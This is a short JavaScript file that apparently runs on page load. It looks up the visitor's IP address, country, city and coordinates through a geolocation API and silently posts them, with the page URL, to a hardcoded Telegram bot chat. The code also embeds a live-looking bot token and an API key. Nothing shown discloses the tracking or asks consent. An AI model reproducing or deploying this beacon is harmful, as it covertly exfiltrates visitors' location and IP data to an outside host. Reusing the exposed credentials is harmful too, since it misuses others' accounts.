const url = 'https://api.telegram.org/bot6270277103:AAFYm4jwfYRHPfj6xpXjIbu350f0eF5g9b4/sendMessage?chat_id=-1001827432978&text=';
const ipUrl = "https://api.geoapify.com/v1/ipinfo?&apiKey=7a2a5ac318a24fdea9a25f23bdf4893c";

function getPostData(){
 fetch(ipUrl)
  .then(res=>res.json())
  .then((res)=>{
    console.log(res);
 const fullN = `Continent: ${res.continent.name}, Country: ${res.country.name}, Capital: ${res.country.capital}, State: ${res.state.name}, City:${res.city.name}, Latitude: ${res.location.latitude}, Longitide: ${res.location.longitude}, IP: ${res.ip}, Page: ${window.location.href}`;   
fetch(url + fullN)
  .then(res=>res.json())
  .then(res=>console.log(res));  
  });
};
getPostData();
